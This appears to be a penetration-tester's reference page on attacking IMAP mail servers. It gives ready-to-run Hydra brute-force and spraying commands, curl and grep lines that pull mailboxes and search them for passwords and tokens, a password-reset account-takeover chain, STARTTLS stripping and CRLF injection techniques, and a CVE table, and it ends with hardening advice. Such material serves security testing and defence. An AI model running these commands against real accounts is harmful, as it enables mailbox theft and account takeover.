+++
title = 'IMAP'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'imap']
+++

The Internet Message Access Protocol (IMAP) works on **TCP port 143 (unencrypted)** and **993 (implicit TLS)**. Unlike POP3, IMAP allows **online management of email directly on the server** and supports **folder structures** — which makes a compromised IMAP account a **live-intelligence source**, not just a static mailbox dump.

> **2025–2026 context:** IMAP is no longer just a mail-retrieval protocol — it is the **persistence mechanism of choice** for advanced adversaries. The 2026 Zimbra espionage campaigns (Laundry Bear, Ulej) used IMAP as a **covert, MFA-bypassing persistence channel**: after gaining webmail access, they **enabled IMAP on the mailbox** and created **application-specific passwords**, allowing continued mailbox access **outside the browser session** and outside MFA. On the server side, **Dovecot, Cyrus, and Courier** produced a steady stream of authentication-bypass, memory-disclosure, and command-injection CVEs throughout 2025–2026.

---

## 1. IMAP vs POP3 — What the Protocol Choice Tells You

The protocol in use determines what you can extract and how.

| | **POP3** | **IMAP** |
|---|---|---|
| **Mailbox model** | One INBOX, downloaded and deleted (or kept) | Multiple folders, server-side state |
| **State** | Stateless between sessions | Stateful — flags, read/unread, folders |
| **IDLE / push** | No | **Yes — `IDLE`** |
| **Typical port** | 110 / 995 | **143 / 993** |
| **What an attacker gains** | Mail content only | **Mail content + folder structure + search + real-time monitoring** |

> **IMAP is the better persistence channel.** The `IDLE` command lets a client **wait for new messages in real time** — an attacker who holds an IMAP session receives password-reset emails and MFA codes **as they arrive**, not on a polling interval.

---

## 2. Basic Interaction

| Command | Purpose |
|---|---|
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to IMAPS (implicit TLS, port 993) |
| `openssl s_client -connect <FQDN/IP>:143 -starttls imap` | STARTTLS upgrade on port 143 |
| `curl -k 'imaps://<FQDN/IP>' --user :` | Log in via cURL |
| `nc -nv <FQDN/IP> 143` | Raw banner grab |
| `hydra -L users.txt -p validpassword -f <IP> imap` | Login bruteforce |
| `nmap -sV -p143,993 --script imap-capabilities,imap-ntlm-info <IP>` | Version and capability detection |

**Nmap scripts:**

```bash
# CAPABILITY and NTLM info without authentication
nmap --script imap-capabilities,imap-ntlm-info -p 143 <IP>
```

> **`imap-ntlm-info` leaks the Windows version and domain** on Exchange servers — before you send a single credential.

---

## 3. IMAP Commands

Every command is prefixed with a **tag** (an arbitrary alphanumeric string, `1` in the examples) and the server responds with `*` untagged responses followed by `<tag> OK` or `<tag> BAD`.

| Command | Description |
|---|---|
| `1 LOGIN username password` | Authenticate |
| `1 LIST "" *` | List all mailboxes |
| `1 LSUB "" *` | List subscribed mailboxes |
| `1 SELECT INBOX` | Select a mailbox for access |
| `1 UNSELECT INBOX` | Exit the selected mailbox |
| `1 FETCH 1 BODY[TEXT]` | Retrieve the body of message 1 |
| `1 FETCH 1:* (FLAGS)` | Retrieve flags for all messages |
| `1 SEARCH ALL` | List all message IDs |
| `1 SEARCH TEXT "password"` | **Search message content for a keyword** |
| `1 STORE 1 +FLAGS (\Deleted)` | Mark a message as deleted |
| `1 CREATE "INBOX"` | Create a mailbox |
| `1 DELETE "INBOX"` | Delete a mailbox |
| `1 RENAME "ToRead" "Important"` | Rename a mailbox |
| `1 CLOSE` | Expunge deleted messages |
| `1 LOGOUT` | Close the connection |

### 3.1 The mailbox enumeration workflow

```text
1 LOGIN alice P@ssw0rd
1 LIST "" *
# * LIST (\HasNoChildren) "/" "INBOX"
# * LIST (\HasNoChildren) "/" "Sent"
# * LIST (\HasNoChildren) "/" "Drafts"
# * LIST (\HasNoChildren) "/" "Archive"

1 SELECT INBOX
1 SEARCH ALL
# * SEARCH 1 2 3 4 5
1 FETCH 1:* (FLAGS BODY[HEADER.FIELDS (SUBJECT FROM DATE)])
```

### 3.2 Scripted extraction

```bash
# Fetch the whole INBOX with curl
curl -k --user "alice:P@ssw0rd" "imaps://target/INBOX" -o /tmp/inbox.mbox

# Search for credentials in message bodies
curl -k --user "alice:P@ssw0rd" "imaps://target/INBOX" | grep -iE 'password|token|api_key|reset'
```

> **`SEARCH TEXT` is the highest-value command on a compromised mailbox.** It turns the mailbox into a **searchable credential store** — `SEARCH TEXT "password"`, `SEARCH TEXT "reset"`, `SEARCH TEXT "token"` — without downloading every message.

---

## 4. Authentication Attacks

### 4.1 Bruteforce and spraying

```bash
# Hydra — single password against a user list
hydra -L users.txt -p 'Spring2026!' -f <IP> imap

# Hydra — credential pairing
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> imap
```

> **IMAP has no protocol-level lockout.** Rate limiting is server-side, and many deployments have none — but check the server's response to repeated failures before committing to a large wordlist.

### 4.2 SASL mechanism enumeration

```text
1 CAPABILITY
# * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN AUTH=LOGIN AUTH=CRAM-MD5 AUTH=XOAUTH2
```

| Mechanism | Weakness |
|---|---|
| **`PLAIN` / `LOGIN`** | Base64-encoded password — equivalent to plaintext without TLS |
| **`CRAM-MD5`** | Challenge-response — **crackable offline**, but the password is not transmitted |
| **`XOAUTH2`** | Bearer-token auth — **bypasses MFA entirely** and is the persistence mechanism in the 2026 Zimbra campaigns |

### 4.3 XOAUTH2 and application-specific passwords

**XOAUTH2 lets a client authenticate with an OAuth2 bearer token instead of a password.** It is the modern, MFA-compatible path — and that is precisely why it is valuable to an attacker: a stolen bearer token authenticates **without triggering MFA**.

**CVE-2025-14524 (curl)** — libcurl did **not clear the OAuth2 bearer token on cross-host redirects**, while it did clear standard credentials. An application redirected from a trusted server to an attacker’s server (via an open redirect) on a SASL-capable protocol — **including IMAP** — would **send the valid bearer token to the attacker**.

> **The 2026 Zimbra persistence chain:** after webmail compromise, the attacker **enabled IMAP** on the account (`zimbraPrefImapEnabled = true`) and created an **application-specific password** labeled “ZimbraWeb”. That password authenticates over IMAP **without the user's primary password and without MFA** — and survives a password reset.

---

## 5. TLS Attacks — STARTTLS Stripping

`STARTTLS` is **negotiated, not enforced**. An on-path attacker can strip the `STARTTLS` capability from the `CAPABILITY` response, and the client falls back to plaintext.

### 5.1 The MailKit STARTTLS response injection (GHSA-9J88-VVJ5-VHGR)

A 2026 vulnerability in **MailKit** (C#) demonstrates the class precisely. The client reads the `STARTTLS` response and **does not flush the internal read buffer** when it swaps the plaintext stream for an `SslStream`. An attacker appends extra data after the `220 Ready` response:

```
Client          MitM            Real Server
  |--- STARTTLS -->|--- STARTTLS -->|
  |<-- 220 Ready --|<-- "220 Ready\r\n" --|
  |                |  "250 AUTH PLAIN"   |  ← INJECTED
  |===== TLS HANDSHAKE ====|===== PASSES THROUGH =====|
  |--- CAPABILITY (over TLS) -->|
  |                |  Reads from BUFFER: "250 AUTH PLAIN"  ← PRE-TLS DATA
```

The injected **SASL mechanism downgrade** (`250 AUTH PLAIN` instead of `SCRAM-SHA-256`) is processed as a **trusted post-TLS response** — the client then offers `PLAIN` and the password is exposed.

> **This is the same vulnerability class as** CVE-2021-23993 (Thunderbird), CVE-2021-33515 (Dovecot), and CVE-2011-0411 (Postfix). **The defence is implicit TLS on 993** — there is no negotiation to strip.

### 5.2 net-imap STARTTLS stripping (GHSA-vcgp-9326-pqcp)

The Ruby `net-imap` library was vulnerable to a **timing-based STARTTLS stripping** attack: a MitM injects a **tagged `OK` response with a predictable tag** before the client’s `STARTTLS` command completes, causing `starttls` to return “successfully” **without starting TLS**.

---

## 6. IMAP Command Injection

When an application builds an IMAP command from user-controlled input **without escaping**, an attacker can inject **CRLF sequences** and append arbitrary commands.

### 6.1 The vulnerable library pattern — `net-imap` (CVE-2026-42257)

Several `Net::IMAP` commands accept a **raw string argument** that is sent to the server **without validation or escaping**:

| Command | Raw argument |
|---|---|
| **`#search` / `#uid_search`** | `criteria` (when a String) |
| **`#fetch` / `#uid_fetch`** | `attr` (when a String or an Array of Strings) |
| **`#store` / `#uid_store`** | `attr` (when a String) |
| **`#sort` / `#thread`** | criteria |

A user-controlled search term containing `\r\n` **breaks out of the intended command context** and appends a new IMAP command — e.g. `DELETE mailbox`.

### 6.2 The injection impact

> **Command injection does not directly exfiltrate data — but it is a force multiplier.** Combined with knowledge of shared mail folders or the application's response handlers, it enables **mailbox deletion, permission changes, and message relocation** — and the same primitive can be used to **plant a message that the application later parses**.

**CWE-93 (CRLF Injection) / CWE-77 (Command Injection)** — the fix is to use the library's **astring encoding** (atom, quoted, or literal) rather than `RawData`.

---

## 7. Server-Side CVEs (2025–2026)

The IMAP protocol is stable; the **server implementations** are where the exploitable bugs live. **Fingerprint the implementation first**, then look up that product's CVEs.

### 7.1 Dovecot

| CVE | Primitive |
|---|---|
| **CVE-2025-59028** | Invalid base64 SASL data → **DoS** (Ubuntu 25.10) |
| **CVE-2025-59031** | `decode2text.sh` **path traversal** — OOXML extraction follows symlinks and reads unintended files |
| **CVE-2025-59032** | `AUTHENTICATE` with literal SASL response → **DoS** |
| **CVE-2026-24031** | **SQL-based authentication bypass** |
| **CVE-2026-27860** | **LDAP authentication** bypass — probing of LDAP structure |
| **CVE-2026-27855** | **OTP replay attack** — bypass authentication if auth cache is enabled |
| **CVE-2026-27856** | **Timing attack** → credential discovery |
| **CVE-2026-0394** | **Path traversal** in `passwd-file` → read `/etc/passwd` |
| **CVE-2026-42392** | Valid credentials + invalid `URLFETCH` → **uninitialised memory disclosure** |

### 7.2 Cyrus IMAP

| CVE | Primitive |
|---|---|
| **CVE-2026-47085** | **URLAUTH token forgery** via a missing `mboxkey` — predictable HMAC-SHA1 → **read access to the mailbox** |
| **CVE-2026-61908** | JMAP email-header blob ID → **out-of-bounds index** |
| **CVE-2026-47089** | `LISTRIGHTS` not limited to admin users |

### 7.3 Courier

| CVE | Primitive |
|---|---|
| **CVE-2026-67194** | Authenticated IMAP user crashes `imapd` → **DoS** |

### 7.4 hMailServer

| CVE | Primitive |
|---|---|
| **CVE-2026-107581** | Several IMAP commands are processed in **quadratic time** → DoS via a single signed-in account |

> **The 2026 pattern:** the highest-severity bugs are **authentication bypasses** (Dovecot SQL/LDAP/OTP) and **memory disclosure** (Dovecot `URLFETCH`, Cyrus `URLAUTH`) — not remote code execution. An authentication bypass on a mail server is **mailbox access without a password**, which is the same outcome an attacker wants from a credential.

---

## 8. Mailbox Exfiltration — The Real Objective

A compromised IMAP account is a **credential-discovery and persistence primitive**, not just a mail-reading one.

### 8.1 What to extract

| Source | What it leaks |
|---|---|
| **Password reset emails** | Tokens and links for other services |
| **Onboarding emails** | Initial passwords, VPN credentials |
| **Vendor notifications** | API keys, infrastructure details |
| **Attachments** | Config files, backups, spreadsheets |
| **Headers** | Internal IPs, mail-server paths, SPF/DKIM infrastructure |

### 8.2 The extraction commands

```text
1 SELECT INBOX
1 SEARCH TEXT "password"
1 SEARCH TEXT "reset"
1 SEARCH TEXT "token"
1 FETCH <id> BODY[TEXT]
```

```bash
# Bulk extraction with curl
curl -k --user "user:pass" "imaps://target/INBOX" -o /tmp/inbox.mbox
grep -iE 'password|token|api[_-]?key|reset' /tmp/inbox.mbox
grep -oE 'https?://[^" >]+' /tmp/inbox.mbox | sort -u
```

### 8.3 Password-reset interception

If the mailbox is the **recovery channel** for the target application:

1. Trigger a password reset on the application.
2. Retrieve the reset email via IMAP.
3. Complete the reset — **without knowing the original password**.

> **This is the account-takeover chain** that makes a mailbox a critical finding. The 2026 Zimbra campaigns used IMAP persistence precisely to **maintain this channel** after the initial browser session ended.

---

## 9. Tooling

| Tool | Purpose |
|---|---|
| **`openssl s_client`** | TLS inspection, `STARTTLS` verification |
| **`nc` / `telnet`** | Manual protocol interaction |
| **`curl`** | `imap://` and `imaps://` support — scripted extraction |
| **Hydra / Medusa** | Authentication bruteforce |
| **`nmap --script imap-*`** | Capabilities, NTLM info, version |
| **`imap-pentesting` skill (wgpsec)** | Structured methodology — discovery, banner analysis, bruteforce, mailbox enumeration, command injection, CVE lookup |
| **`searchsploit <imap_server> <version>`** | Match the fingerprinted server against ExploitDB |

---

## 10. Testing Methodology

```text
1. Discover and fingerprint
   - nc -nv <IP> 143 → banner (Dovecot / Courier / Cyrus / Exchange / Zimbra)
   - nmap --script imap-capabilities,imap-ntlm-info -p 143
   - nmap -sV -p 993

2. TLS posture
   - openssl s_client -connect <IP>:993
   - Is STARTTLS strippable on 143?

3. Authentication
   - Default credentials
   - Password spray one password across users
   - Hydra if lockout is absent

4. Mailbox enumeration
   - 1 LIST "" *
   - 1 SELECT INBOX
   - 1 SEARCH ALL
   - 1 FETCH <id> BODY[TEXT]

5. Credential discovery
   - SEARCH TEXT "password"
   - grep the mbox for tokens, URLs, email addresses
   - Extract the Received headers for infrastructure

6. Account-takeover chain
   - Trigger a password reset
   - Retrieve the email via IMAP
   - Complete the reset

7. Patch level
   - Identify the implementation and version
   - Dovecot: CVE-2026-24031, CVE-2026-27855/27856, CVE-2026-42392
   - Cyrus: CVE-2026-47085, CVE-2026-47089
   - Courier: CVE-2026-67194

8. Command injection (if an application uses IMAP)
   - Test SEARCH / FETCH / STORE arguments for CRLF
```

---

## 11. Hardening

| Control | How |
|---|---|
| **Require TLS** | Disable port 143; use 993 only |
| **Disable `PLAIN` / `LOGIN` without TLS** | `disable_plaintext_auth = yes` |
| **Enforce STARTTLS** | Reject authentication on an unencrypted connection |
| **Audit `XOAUTH2` and app-specific passwords** | The 2026 persistence vector — rotate tokens, monitor app-password creation |
| **Patch the server** | Dovecot, Cyrus, Courier — check vendor advisories |
| **Disable URLAUTH if unused** | CVE-2026-42392, CVE-2026-47085 |
| **Monitor `zimbraPrefImapEnabled`** | A mailbox with IMAP enabled that never used it is a persistence signal |
| **Rate-limit authentication** | `auth_failure_delay`, fail2ban |
| **Restrict reachability** | Firewall 143/993 to known client ranges |

---

## 12. Field Notes

- **IMAP is the persistence channel, not just the retrieval protocol.** The 2026 Zimbra campaigns enabled IMAP and minted app-specific passwords to **survive password resets and MFA**.
- **`IDLE` makes IMAP a live-intelligence source.** A held session receives reset emails and MFA codes **as they arrive**.
- **`SEARCH TEXT` is the fastest credential-discovery command.** Search for `password`, `reset`, and `token` before downloading the mailbox.
- **STARTTLS stripping is still alive in 2026.** MailKit’s unflushed buffer (GHSA-9J88-VVJ5-VHGR) and net-imap’s predictable tag (GHSA-vcgp-9326-pqcp) are the same class as CVE-2021-23993 and CVE-2011-0411.
- **XOAUTH2 bearer tokens bypass MFA.** CVE-2025-14524 (curl) leaked the token on cross-host redirects over **IMAP**.
- **IMAP command injection is CRLF, not SQL.** `net-imap` sends `SEARCH`, `FETCH`, and `STORE` arguments **raw** — a `\r\n` appends a new command.
- **The highest-severity 2026 CVEs are authentication bypasses**, not RCE — Dovecot’s SQL/LDAP/OTP bypasses and Cyrus’s URLAUTH forgery.
- **`CVE-2026-42392` is a memory disclosure** — a valid credential plus an invalid `URLFETCH` returns **process memory** to the client.
- **The mailbox is the recovery channel.** IMAP access plus a password-reset trigger equals account takeover **without the password**.
- **Fingerprint the implementation first.** Dovecot, Cyrus, Courier, Exchange, and Zimbra have completely different CVE sets — a generic "IMAP CVE" search is useless.
